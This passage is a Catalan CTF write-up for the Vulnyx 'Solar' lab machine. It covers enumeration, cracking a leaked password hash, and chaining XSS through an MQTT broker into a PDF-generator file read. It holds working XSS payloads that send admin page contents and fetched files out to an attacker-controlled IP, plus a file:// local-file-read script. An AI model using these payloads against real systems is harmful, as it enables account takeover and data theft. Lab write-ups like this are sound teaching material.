---
author: Lenam  
pubDatetime: 2024-10-23T15:22:00Z  
title: WriteUp Solar - Vulnyx  
slug: solar-writeup-vulnyx-ca
featured: false  
draft: false  
ogImage: "../../../assets/images/solar/OpenGraph.png"  
tags:  
  - writeup  
  - vulnyx
  - xss
  - rce
  - lfi
  - session-spying
  - password-cracking
  - cron
  - doas
  - mqtt
  - pdf-injection
  - gpg
  - nodejs
description:  
  A continuació, es descriu el procés esperat per a la vulneració del CTF Solar de Vulnyx. Una màquina laboriosa i que necessita paciència.
lang: ca  
---

A continuació, es descriu el procés esperat per a la vulneració del CTF Solar de Vulnyx. Una màquina laboriosa i que necessita paciència. Segurament, utilitzant eines com BeeF pot ser més fàcil, en aquest writeup es descriu una forma manual de resoldre-ho.

Espero que sigui del vostre grat.

![Solar ASCII Art](../../../assets/images/solar/image.png)

## Taula de continguts

## Enumeració

### nmap

La IP de l'objectiu en aquest writeup és `192.168.1.173`, pot ser que la IP sigui una altra en els exemples, ja que aquest writeup ha estat realitzat en diferents parts i la IP assignada va ser una altra.

```bash
$ nmap -p- -n -Pn 192.168.1.173 -o all_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 02:27 CEST
Nmap scan report for 192.168.1.173
Host is up (0.00017s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 3.01 seconds
```

```bash
$ nmap -p22,80,443 -sVC 192.168.1.173 -oN specific_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 02:28 CEST
Nmap scan report for solar.nyx (192.168.1.173)
Host is up (0.00032s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 00:31:c1:0a:8b:0f:c9:45:e7:2f:7f:06:0c:4f:cb:42 (ECDSA)
|_  256 6b:04:c5:5d:39:ed:b3:41:d0:23:2b:77:d1:53:d0:48 (ED25519)
80/tcp  open  http     Apache httpd 2.4.62 ((Debian))
|_http-title: El lloc no té títol (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Solar Energy Control Login
| ssl-cert: Subject: commonName=www.solar.nyx/organizationName=Solar/stateOrProvinceName=Madrid/countryName=ES
| Subject Alternative Name: DNS:www.solar.nyx, DNS:www.sunfriends.nyx
| Not valid before: 2024-10-10T00:03:30
|_Not valid after:  2034-10-08T00:03:30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
```

Afegim `www.solar.nyx` i `www.sunfriends.nyx` a `/etc/hosts`.

```bash
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
192.168.1.173   www.solar.nyx www.sunfriends.nyx
```

Si intentem accedir al port 80, se'ns dirigeix a `https://www.solar.nyx`, però podem veure dos llocs web amb certificat SSL autofirmat pel port 443.

**www.solar.nyx**

![www.solar.nyx](../../../assets/images/solar/image-1.png)

**www.sunfriends.nyx**

![www.sunfriends.nyx](../../../assets/images/solar/image-2.png)

### Fuzzing

**www.solar.nyx**

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://www.solar.nyx -x php -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://www.solar.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 745]
/login.php            (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> index.php?msg=Log-out.]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
/records              (Status: 301) [Size: 318] [--> https://www.solar.nyx/records/]
/session.php          (Status: 200) [Size: 0]
```

**www.sunfriends.nyx**

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://www.sunfriends.nyx -x php -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://www.sunfriends.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 284]
/index.php            (Status: 200) [Size: 11089]
/server.php           (Status: 200) [Size: 1523]
/commands             (Status: 301) [Size: 329] [--> https://www.sunfriends.nyx/commands/]
/.php                 (Status: 403) [Size: 284]
/server-status        (Status: 403) [Size: 284]
```

Atès que apareix el missatge:

```text 
The forum is temporarily unavailable due to maintenance on the server.
We apologize for the inconvenience. 
```

Realitzem fuzzing per veure si trobem alguna base de dades, backup o fitxer que estiguin utilitzant durant el manteniment.


```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://www.sunfriends.nyx -x txt,db,sql,gz,sql.gz,sqlite,rar,tar,zip,gzip,gz2 -k

... or ...

$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt -u https://www.sunfriends.nyx -x txt,db,sql,gz,sql.gz,sqlite,rar,tar,zip,gzip,gz2 -k 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://www.sunfriends.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sql.gz,rar,tar,zip,txt,db,gz,gz2,sql,sqlite,gzip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/database.sql.gz      (Status: 200) [Size: 1147]
Progress: 4032 / 4044 (99.70%)
===============================================================
Finished
===============================================================
```

Hem trobat l'arxiu https://www.sunfriends.nyx/database.sql.gz, l'hem descarregat, el hem descomprim i hem trobat una base de dades amb els següents dades d'usuaris.

## Cracking hash

Al fitxer de backup de la base de dades trobem.


```sql
INSERT INTO `users` VALUES
(1,'Robert24','66dc8ac996672de0cdeb294808d4cca21ba0bc856c365e90562565853febed0c','user'),
(2,'calvin','e8e9689deac5bac977b64e85c1105bd1419608f1223bdafb8e5fbdf6cf939879','user'),
(3,'JulianAdm','bbca1b30190fddeead4e1a845ee063bec94499601aa5ee795da8917767bdcdde','admin'),
(4,'John20','38858f3066c9a6f3d8c6e54fbfcff204d5383f0721c32bc8ae46cf46a93e3694','user');
```

Només hem aconseguit trencar l'hash de l'usuari **calvin**, el resta de contrasenyes semblen ser segures.

```bash
$ echo e8e9689deac5bac977b64e85c1105bd1419608f1223bdafb8e5fbdf6cf939879 > hash-calvin
$ hashcat ./hash-calvin
$ hashcat -m 1400 hash-calvin /usr/share/wordlists/rockyou.txt
$ hashcat -m 1400 hash-calvin /usr/share/wordlists/rockyou.txt --show
e8e9689deac5bac977b64e85c1105bd1419608f1223bdafb8e5fbdf6cf939879:emily
```


En poc temps obtenim la contrasenya `emily`, a la qual accedim al formulari en `www.solar.nyx` amb les credencials `calvin:emily`.


## XSS a través de MQTT

Analitzem el codi de https://www.solar.nyx/dashboard.php.

![www.solar.nyx/dashboard.php](../../../assets/images/solar/image-3.png)


```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solar Energy Dashboard</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/style2.css">
</head>

<body>
    <div class="dashboard">
        <object class="solar-icon" data="sun.svg" type="image/svg+xml" style="width:75px;"></object>
        <h1>Solar Energy Dashboard</h1>
        <div class="user-info" id="userInfo"><span>User Name</span><br>Role</div>
        <canvas id="energyChart" class="energy-chart"></canvas>
        <div class="energy-label"><span class="solar-title">Solar:</span> <span id="solarEnergyLabel"
                class="energy-value solar">0 kWh</span></div>
        <div class="energy-label"><span class="consumed-title">Consumed:</span> <span id="consumedEnergyLabel"
                class="energy-value consumed">0 kWh</span></div>
        <div class="energy-label"><span class="grid-title">Grid:</span> <span id="gridEnergyLabel"
                class="energy-value grid-positive">0 kWh</span></div>
        <a href="/logout.php" class="logout-link" id="logoutLink">Logout</a>
            </div>

    <!--<script src="/mqtt.min.js"></script>-->
    
    <script src="/chart.js"></script>
    <script type="module">
        import mqtt from '/mqtt.js'
        
        let userName = "calvin";
        let userRole = "user";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'user',
            password: '1tEa15klQpTx9Oub6ENG',
            protocolId: 'MQTT'
        });

        mqttclient.on("message", getMessagesStatus);

        function getMessagesStatus(msTopic, msBody) {
            let data = JSON.parse(msBody.toString());
            setParams(data.solarEnergy, data.consumedEnergy);
        }

        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });

        let solar = 0, consumed = 0, grid = 0;

        // Initialize the bar chart using Chart.js
        const ctx = document.getElementById('energyChart').getContext('2d');
        let energyChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: ['Solar', 'Consumed', 'Grid'],
                datasets: [{
                    label: 'Energy (kWh)',
                    data: [solar, consumed, grid],
                    backgroundColor: ['#6fcf97', '#eb5757', '#56ccf2'],
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            callback: function (value) { return value + " kWh"; }
                        }
                    }
                },
                plugins: {
                    legend: {
                        display: false
                    },
                    tooltip: {
                        callbacks: {
                            label: function (context) {
                                return context.dataset.label + ': ' + context.raw + ' kWh';
                            }
                        }
                    }
                }
            }
        });

        // Update the chart and labels with new data
        function setParams(solarEnergy, consumedEnergy) {
            let gridEnergy = consumedEnergy - solarEnergy;
            solar = solarEnergy;
            consumed = consumedEnergy;
            grid = gridEnergy;
            

            // Update the bar chart
            energyChart.data.datasets[0].data = [solar, consumed, grid];
            energyChart.update();

            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;

            let gridLabel = document.getElementById('gridEnergyLabel');
            gridLabel.innerHTML = `<span class="energy-value ${gridEnergy < 0 ? 'grid-negative' : 'grid-positive'}">${gridEnergy} kWh</span>`;

            document.getElementById('userInfo').innerHTML = `<span>${userName}</span><br>${userRole}`;
        }

        setParams(0, 0);

    
    </script>
</body>

</html>
```

Sembla que hi ha un broker MQTT accessible per mitjà de websockets al port 443 i a l'endpoint `wss://www.solar.nyx/wss/`. A més, en el mateix codi es mostren les credencials per connectar-se al broker MQTT:

```javascript
...
        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'user',
            password: '1tEa15klQpTx9Oub6ENG',
            protocolId: 'MQTT'
        });
...
``` 

També observem que les dades es reben del topic `data` i es mostren al dashboard en temps real. Aquestes dades corresponen a la producció d'energia solar i el consum elèctric de la instal·lació comunitària.

```javascript
...
        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });
...
```

Ens connectem al servidor mitjançant un client MQTT i ens subscrivim al topic `#`, cosa que ens permetrà rebre les dades de tots els topics als quals l'usuari tingui accés. Podem utilitzar qualsevol client que permeti connexions per websockets, però per facilitar la tasca utilitzem MQTTX, que té GUI i està disponible per a diferents plataformes.

https://mqttx.app/downloads
https://github.com/emqx/MQTTX

![Configuració MQTT user](../../../assets/images/solar/image-4.png)

Veiem que comencem a rebre al client MQTT les mateixes dades que al dashboard.

![alt text](../../../assets/images/solar/image-4-old.png)

Si publiquem dades al topic `data`, veurem com es reflecteixen al `dashboard.php`.

![alt text](../../../assets/images/solar/image-5-old.png)

Enviem una dada de consum molt alt i veiem com les barres del gràfic es mouen. Al codi de la pàgina, observem que podem realitzar un XSS (Cross-Site Scripting), ja que s'utilitza només `innerHTML` sense sanititzar el contingut de les propietats `solarEnergy` i `consumedEnergy` del JSON enviat.

```javascript
...
            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;
...
```

Podem enviar un JSON com el següent i executar qualsevol JavaScript a la pàgina `dashboard.php` a la part del client/navegador.

```json
{
  "solarEnergy": "<img src=x onerror=eval(atob(\/[base64encodeJavascriptCode]\/.source)); />",
  "consumedEnergy": 15
}
```

Veiem que la cookie de sessió està configurada com a `HttpOnly`, `Secure` i amb la política `SameSite` com a `Strict`. No trobem cap lloc al servidor on es mostrin les capçaleres (com el típic `phpInfo();`). Serà molt difícil robar la cookie d'un altre usuari, però podem intentar visualitzar el que ell està veient, ja que les capçaleres CSP no estan configurades.

Segons les converses del fòrum `www.sunfriends.nyx`, és molt probable que l'usuari `JulianAdm` estigui visualitzant el Dashboard.

Levantem un servidor al port 80 amb Python:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

I enviem el següent `JSON` mitjançant `MQTTX` al topic `data` amb la nostra adreça IP:

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => {location.href='http://192.168.1.116?url='+encodeURIComponent(window.location.href)+'&code='+btoa(document.body.outerHTML);})();\"; />",
  "consumedEnergy": 15
}
```

Rebem almenys dues peticions al nostre servei HTTP al port 80, una des de la nostra IP i una altra des de la IP de la màquina.

```bash
192.168.1.168 - - [03/Sep/2024 00:18:34] "GET /?url=https%3A%2F%2Fwww.solar.nyx%2Fdashboard.php&code=PGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJkYXNoYm9hcmQiPgogICAgICAgIDxvYmpl ... ZW50LmdldEVsZW1lbnRCeUlkKCdzZW5kLXJlY29yZC1pZCcpLm9uY2xpY2sgPSBzZW5kcmVjb3JkOwogICAgCiAgICA8L3NjcmlwdD4KCgo8L2JvZHk+ HTTP/1.1" 200 -
```

Si descodifiquem el base64, obtindrem el següent codi:

```html
<body>
    <div class="dashboard">
        <object class="solar-icon" data="sun.svg" type="image/svg+xml" style="width:75px;"></object>
        <h1>Solar Energy Dashboard</h1>
        <div class="user-info" id="userInfo"><span>JulianAdm</span><br>admin</div>
        <canvas id="energyChart" class="energy-chart" width="400" height="200" style="display: block; box-sizing: border-box; height: 200px; width: 400px;"></canvas>
        <div class="energy-label"><span class="solar-title">Solar:</span> <span id="solarEnergyLabel" class="energy-value solar"><span class="energy-value solar"><img src="x" onerror="(async () => {location.href='http://192.168.1.116?url='+encodeURIComponent(window.location.href)+'&amp;code='+btoa(document.body.outerHTML);})();" ;=""> kWh</span></span></div>
        <div class="energy-label"><span class="consumed-title">Consumed:</span> <span id="consumedEnergyLabel" class="energy-value consumed"><span class="energy-value consumed">15 kWh</span></span></div>
        <div class="energy-label"><span class="grid-title">Grid:</span> <span id="gridEnergyLabel" class="energy-value grid-positive"><span class="energy-value grid-positive">NaN kWh</span></span></div>
        <a href="/logout.php" class="logout-link" id="logoutLink">Logout</a>
                    <a href="/records/" class="logout-link">Records</a>
            <a href="#" class="logout-link" id="send-record-id">Send record</a>
            </div>

    <!--<script src="/mqtt.min.js"></script>-->
    
    <script src="/chart.js"></script>
    <script type="module">
        import mqtt from '/mqtt.js'
        
        let userName = "JulianAdm";
        let userRole = "admin";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'admin',
            password: 'tJH8HvwVwC57BR6CEyg5',
            protocolId: 'MQTT'
        });

        mqttclient.on("message", getMessagesStatus);

        function getMessagesStatus(msTopic, msBody) {
            let data = JSON.parse(msBody.toString());
            setParams(data.solarEnergy, data.consumedEnergy);
        }

        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });

        let solar = 0, consumed = 0, grid = 0;

        // Initialize the bar chart using Chart.js
        const ctx = document.getElementById('energyChart').getContext('2d');
        let energyChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: ['Solar', 'Consumed', 'Grid'],
                datasets: [{
                    label: 'Energy (kWh)',
                    data: [solar, consumed, grid],
                    backgroundColor: ['#6fcf97', '#eb5757', '#56ccf2'],
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            callback: function (value) { return value + " kWh"; }
                        }
                    }
                },
                plugins: {
                    legend: {
                        display: false
                    },
                    tooltip: {
                        callbacks: {
                            label: function (context) {
                                return context.dataset.label + ': ' + context.raw + ' kWh';
                            }
                        }
                    }
                }
            }
        });

        // Update the chart and labels with new data
        function setParams(solarEnergy, consumedEnergy) {
            let gridEnergy = consumedEnergy - solarEnergy;
            solar = solarEnergy;
            consumed = consumedEnergy;
            grid = gridEnergy;
            

            // Update the bar chart
            energyChart.data.datasets[0].data = [solar, consumed, grid];
            energyChart.update();

            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;

            let gridLabel = document.getElementById('gridEnergyLabel');
            gridLabel.innerHTML = `<span class="energy-value ${gridEnergy < 0 ? 'grid-negative' : 'grid-positive'}">${gridEnergy} kWh</span>`;

            document.getElementById('userInfo').innerHTML = `<span>${userName}</span><br>${userRole}`;
        }

        setParams(0, 0);

            // Show message
            function showMessage(msg) {
                const mensajeDiv = document.createElement('div');
                mensajeDiv.classList.add("temp-message")
                mensajeDiv.textContent = msg;
                document.body.appendChild(mensajeDiv);
                setTimeout(() => {
                    mensajeDiv.remove();
                }, 3000);
            }

            // Function to send the record 
            function sendrecord() {
                let btn = document.getElementById('send-record-id');
                if (!btn.disabled) {
                    // Capture the chart as a base64 image
                    let chartImage = energyChart.toBase64Image();

                    mqttclient.publish('record', JSON.stringify({
                        time: new Date().toISOString(),
                        user: {
                            name: userName,
                            role: userRole
                        },
                        solar: solar,
                        consumed: consumed,
                        grid: grid,
                        chart: chartImage
                    }));

                    btn.disabled = true;
                    btn.style.opacity = '0.3';


                    setTimeout(() => {
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        showMessage('Record was end successfully!')
                    }, 1500);
                }
            }
            document.getElementById('send-record-id').onclick = sendrecord;
    
    </script>


</body>
```

Podem observar diverses diferències en aquest codi.

La pàgina pertany a l'usuari `JulianAdm` que vam veure a la base de dades i al fòrum, però no vam poder desxifrar la seva contrasenya. A més, pertany al rol de `admin`.

```javascript
...
        let userName = "JulianAdm";
        let userRole = "admin";
...
```

Obtenim unes credencials diferents per connectar amb el servei MQTT: `admin:tJH8HvwVwC57BR6CEyg5`. Les utilitzem per connectar-nos amb el client MQTT.

```javascript
...
        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'admin',
            password: 'tJH8HvwVwC57BR6CEyg5',
            protocolId: 'MQTT'
        });
...
```

Una cosa interessant és que hi ha una funció que sembla publicar informació al topic `record`.

```javascript
...
            // Function to send the record
            function sendrecord() {
                let btn = document.getElementById('send-record-id');
                if (!btn.disabled) {
                    // Capture the chart as a base64 image
                    let chartImage = energyChart.toBase64Image();

                    mqttclient.publish('record', JSON.stringify({
                        time: new Date().toISOString(),
                        user: {
                            name: userName,
                            role: userRole
                        },
                        solar: solar,
                        consumed: consumed,
                        grid: grid,
                        chart: chartImage
                    }));

                    btn.disabled = true;
                    btn.style.opacity = '0.3';


                    setTimeout(() => {
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        showMessage('Record was end successfully!')
                    }, 1500);
                }
            }
            document.getElementById('send-record-id').onclick = sendrecord;
...
```

Aquesta funció crea una imatge del gràfic de barres en base64 i, juntament amb altres dades, les envia en un JSON al topic `record` quan l'usuari fa clic al botó `#send-record-id`.

També trobem una altra adreça accessible mitjançant un enllaç: `/records/`. Aquesta adreça no és accessible per l'usuari `calvin`, ja que no té el rol d'administrador.

Ens subscrivim a tots els topics (`#`) utilitzant les credencials `admin:tJH8HvwVwC57BR6CEyg5`, i enviem el següent JSON al topic `data`:

```json
{
  "solarEnergy": "<img src=x onerror=\"document.querySelector(`#send-record-id`).dispatchEvent(new Event('click'));\" />",
  "consumedEnergy": 15
}
```

Rebem el següent JSON al topic `record`:

```json
{"time":"2024-09-02T22:43:52.187Z","user":{"name":"JulianAdm","role":"admin"},"solar":"<img src=x onerror=\"document.querySelector(`#send-record-id`).dispatchEvent(new Event('click'));\" />","consumed":15,"grid":null,"chart":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZAAAADICAYAAADGFbfiAAAgAElEQVR4Xu2dC3QV1b3GgYQYoAUSsMqjRVp5WAsWHwgVV6Mi2tt7aanGFwYDiAnPolXx ... BIgf8D+epLMhrp9ocAAAAASUVORK5CYII="}
```

Els missatges enviats al topic `data` amb l'XSS s'eliminen en rebre noves dades cada 2 segons.

Intentem publicar dades al topic `record` amb l'usuari `admin` del servei MQTT i no tenim problemes, podem fer-ho. Així que intentem introduir un altre XSS al paràmetre `chart` del JSON, intuïnt que serà introduït a l'atribut `src` d'una etiqueta `<img>` d'HTML:

```json
{
  "time": "2024-09-02T23:25:15.855Z",
  "user": {
    "name": "JulianAdm",
    "role": "admin"
  },
  "solar": 211,
  "consumed": 168,
  "grid": -43,
  "chart": "\"><h1>XSS</h1></"
}
```

D'altra banda, intentem obtenir la pàgina allotjada a `/records/`. Sembla tenir relació amb aquest nou topic. Tornem a aixecar el servei HTTP al port 80 a la nostra màquina:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

i enviem el següent JSON al topic `data`:

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => { location.href='http://192.168.1.116/?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/')).arrayBuffer())));})(); \" />",
  "consumedEnergy": 15
}
```

Obtenim al nostre servei HTTP la següent petició:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.168 - - [03/Sep/2024 01:32:57] "GET /?data=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+TGlzdCBvZiBTb2xhciBFbmVyZ3kgRGF0YTwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9zdHlsZS5jc3MiPgogICAgPGxpbmsgcmVsPSJ ... RG93bmxvYWQgUERGPC9hPgogICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgICAgIDwvdGFibGU+CiAgICAgICAgPGEgaHJlZj0iLi4vZGFzaGJvYXJkLnBocCIgY2xhc3M9ImxvZ291dC1saW5rIj4mbHQ7IEJhY2s8L2E+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPg== HTTP/1.1" 200 -
```

Decodifiquem el base64 i trobem el codi següent de la pàgina `/records/`:

```html
<!DOCTYPE html>
<html>

<head>
    <title>List of Solar Energy Data</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/style3.css">
</head>

<body>
    <div style="min-width:400px;background:white;padding:15px;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);">
        <div style="text-align:center;"><object class="solar-icon" data="../sun.svg" type="image/svg+xml" style="width:75px;"></object></div>
        <h1>List of Solar Energy Data</h1>
        <table>
            <tr>
                <th>Record</th>
                <th>Actions</th>
            </tr>
                            <tr>
                    <td>2024-09-02T23:04:27.035Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A04%3A27.035Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:09:07.758Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A09%3A07.758Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                ...

                            <tr>
                    <td>2024-09-02T23:29:26.645Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A29%3A26.645Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                    </table>
        <a href="../dashboard.php" class="logout-link">&lt; Back</a>
    </div>
</body>
</html>
```

Obtenim un llistat de registres en format PDF per descarregar. Mai apareixeran més de 10 registres i, per cada missatge enviat al topic `record`, apareixerà un PDF per descarregar en aquest llistat.

## XSS en PDF a LFI a través de MQTT

Descarreguem alguns d'aquests fitxers utilitzant la mateixa tècnica. Continuem a l'escolta amb el nostre servei HTTP i enviem el següent JSON al topic `data`, introduint les URLs de descàrrega dels fitxers PDF.

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => {location.href='http://192.168.1.116?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/?download=true&file=2024-09-02T23%3A29%3A26.645Z.json')).arrayBuffer())));})();\" />",
  "consumedEnergy": 15
}
```

Aquesta vegada guardem el base64 en un fitxer `base64pdf1.txt`, per exemple.

```bash
cat base64pdf1.txt | base64 -d > document.pdf
```

Si visualitzem el document, podrem veure la injecció XSS enviada.

![PDF XSS](../../../assets/images/solar/image-6.png)

```bash
─$ exiftool document.pdf
ExifTool Version Number         : 12.76
File Name                       : document.pdf
Directory                       : .
File Size                       : 20 kB
File Modification Date/Time     : 2024:09:03 01:46:09+02:00
File Access Date/Time           : 2024:09:03 01:46:19+02:00
File Inode Change Date/Time     : 2024:09:03 01:46:09+02:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : Solar Energy Data
Creator                         : wkhtmltopdf 0.12.6.1
Producer                        : Qt 4.8.7
Create Date                     : 2024:09:02 19:43:43-04:00
Page Count                      : 1
Page Mode                       : UseOutlines
```

Podem observar que són documents creats amb `wkhtmltopdf 0.12.6.1`, que té el CVE `CVE-2022-35583`, però aquest no serà el cas.

Intentem un LFI, però no ho aconseguim amb el fitxer `/etc/passwd`, encara que sí que ho aconseguim amb alguns fitxers PHP dels serveis web.

### Pas 1

Enviem el següent `JSON` al topic `record` mitjançant el client MQTT utilitzant l'usuari `admin:tJH8HvwVwC57BR6CEyg5` per intentar llegir el fitxer `/var/www/solar.nyx/records/index.php` del servidor:

```json
{
  "time": "2024-07-13T00:07:36.621Z",
  "user": {
    "name": "JulianAdm",
    "role": "admin"
  },
  "solar": 232,
  "consumed": 223,
  "grid": -9,
  "chart": "\"><script>\np='/var/www/solar.nyx/records/index.php';\nx=new XMLHttpRequest;\nx.onerror=function(){{document.write('<p>'+p+' not found')}};\nx.onload=function(){{document.write('<p>'+p+'</p><div style=\"word-break: break-all;max-width:90%;\">'+btoa(this.responseText)+'</div>')}};\nx.open(\"GET\",\"file://\"+p);x.send();\n</script><x=\""
}
```

Podem modificar la variable `p='/var/www/solar.nyx/records/index.php'` per seleccionar altres fitxers.

Comprovem que el payload s'ha enviat correctament al topic `record` des del client MQTT.

### Pas 2

Tornem a obtenir al nostre servei HTTP el llistat dels últims `/records/`, enviant el següent JSON al topic `data`:

```json
{
  "solarEnergy": "<img src=x onerror=\"(async () => { location.href='http://192.168.1.116/?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/')).arrayBuffer())));})(); \" />",
  "consumedEnergy": 15
}
```

Decodifiquem el base64 del paràmetre `data` rebut:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.168 - - [03/Sep/2024 02:04:35] "GET /?data=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU ... gICAgICAgICAgICAgICAgIDwvdGFibGU+CiAgICAgICAgPGEgaHJlZj0iLi4vZGFzaGJvYXJkLnBocCIgY2xhc3M9ImxvZ291dC1saW5rIj4mbHQ7IEJhY2s8L2E+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPg== HTTP/1.1" 200 -
```

Obtenim la programació HTML del client i busquem l'últim enllaç al PDF.

```html
<td>
    <td>2024-09-03T00:22:27.568Z</td>
    <td>
        <a href="?download=true&file=2024-09-03T00%3A22%3A27.568Z.json" class="download-btn">Download PDF</a>
    </td>
</td>
```

### Pas 3

Enviem el següent JSON al topic `data` per obtenir al nostre servei HTTP el fitxer PDF de la URL obtinguda en el pas anterior. En el nostre cas, `/records/?download=true&file=2024-09-03T00%3A22%3A27.568Z.json`.

```json
{
